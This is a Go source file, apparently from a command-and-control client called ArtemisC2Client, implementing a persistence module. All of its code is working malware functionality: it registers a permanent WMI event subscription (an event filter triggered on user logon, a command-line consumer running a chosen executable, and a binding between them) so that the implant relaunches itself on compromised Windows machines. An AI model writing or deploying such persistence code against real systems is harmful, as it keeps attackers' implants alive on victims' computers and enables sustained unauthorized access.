package persistence

import (
	"fmt"

	"github.com/desertcod98/ArtemisC2Client/log"
	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)

func tryInitWmi(destPath string) bool {
	if err := ole.CoInitialize(0); err != nil {
		log.Log(err.Error())
	}
	defer ole.CoUninitialize()
	subSvc, err := connectWMI("ROOT\\subscription")
	if err != nil {
		log.Log("connect ROOT\\subscription: " + err.Error())
	}
	defer subSvc.Release()

	eventNamespace := "root\\cimv2"
	query := "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"

	if err := createSubscription(subSvc, "ArtemisC2", eventNamespace, query, destPath); err != nil {
		log.Log("install failed: " + err.Error())
		return false
	}

	return true
}

func connectWMI(namespace string) (*ole.IDispatch, error) {
	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		return nil, err
	}
	defer unknown.Release()

	locator, err := unknown.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return nil, err
	}
	defer locator.Release()

	svcRaw, err := oleutil.CallMethod(locator, "ConnectServer", nil, namespace)
	if err != nil {
		return nil, err
	}
	return svcRaw.ToIDispatch(), nil
}

func createSubscription(subSvc *ole.IDispatch, baseName, eventNamespace, wqlQuery, exePath string) error {
	filterName := baseName + "_Filter"
	consumerName := baseName + "_Consumer"

	// 1) __EventFilter
	filterPath, err := createEventFilter(subSvc, filterName, eventNamespace, wqlQuery)
	if err != nil {
		return fmt.Errorf("create filter: %w", err)
	}

	// 2) CommandLineEventConsumer
	consumerPath, err := createCommandLineConsumer(subSvc, consumerName, exePath)
	if err != nil {
		return fmt.Errorf("create consumer: %w", err)
	}

	// 3) __FilterToConsumerBinding
	if err := createBinding(subSvc, filterPath, consumerPath); err != nil {
		return fmt.Errorf("create binding: %w", err)
	}
	return nil
}

func createEventFilter(subSvc *ole.IDispatch, name, eventNamespace, wqlQuery string) (string, error) {
	classRaw, err := oleutil.CallMethod(subSvc, "Get", "__EventFilter")
	if err != nil {
		return "", err
	}
	classObj := classRaw.ToIDispatch()
	defer classObj.Release()

	instRaw, err := oleutil.CallMethod(classObj, "SpawnInstance_")
	if err != nil {
		return "", err
	}
	inst := instRaw.ToIDispatch()
	defer inst.Release()

	oleutil.PutProperty(inst, "Name", name)
	oleutil.PutProperty(inst, "EventNamespace", eventNamespace)
	oleutil.PutProperty(inst, "QueryLanguage", "WQL")
	oleutil.PutProperty(inst, "Query", wqlQuery)

	// Commit
	if _, err := oleutil.CallMethod(inst, "Put_"); err != nil {
		return "", err
	}

	// Return the object path reference string (RelPath is enough for references)
	return fmt.Sprintf(`__EventFilter.Name="%s"`, name), nil
}

func createCommandLineConsumer(subSvc *ole.IDispatch, name, exePath string) (string, error) {
	classRaw, err := oleutil.CallMethod(subSvc, "Get", "CommandLineEventConsumer")
	if err != nil {
		return "", err
	}
	classObj := classRaw.ToIDispatch()
	defer classObj.Release()

	instRaw, err := oleutil.CallMethod(classObj, "SpawnInstance_")
	if err != nil {
		return "", err
	}
	inst := instRaw.ToIDispatch()
	defer inst.Release()

	oleutil.PutProperty(inst, "Name", name)
	oleutil.PutProperty(inst, "CommandLineTemplate", exePath)

	if _, err := oleutil.CallMethod(inst, "Put_"); err != nil {
		return "", err
	}

	return fmt.Sprintf(`CommandLineEventConsumer.Name="%s"`, name), nil
}

func createBinding(subSvc *ole.IDispatch, filterRelPath, consumerRelPath string) error {
	classRaw, err := oleutil.CallMethod(subSvc, "Get", "__FilterToConsumerBinding")
	if err != nil {
		return err
	}
	classObj := classRaw.ToIDispatch()
	defer classObj.Release()

	instRaw, err := oleutil.CallMethod(classObj, "SpawnInstance_")
	if err != nil {
		return err
	}
	inst := instRaw.ToIDispatch()
	defer inst.Release()

	// Queste proprietà sono "references"; in pratica puoi passare i RelPath e WMI li risolve.
	oleutil.PutProperty(inst, "Filter", filterRelPath)
	oleutil.PutProperty(inst, "Consumer", consumerRelPath)

	_, err = oleutil.CallMethod(inst, "Put_")
	return err
}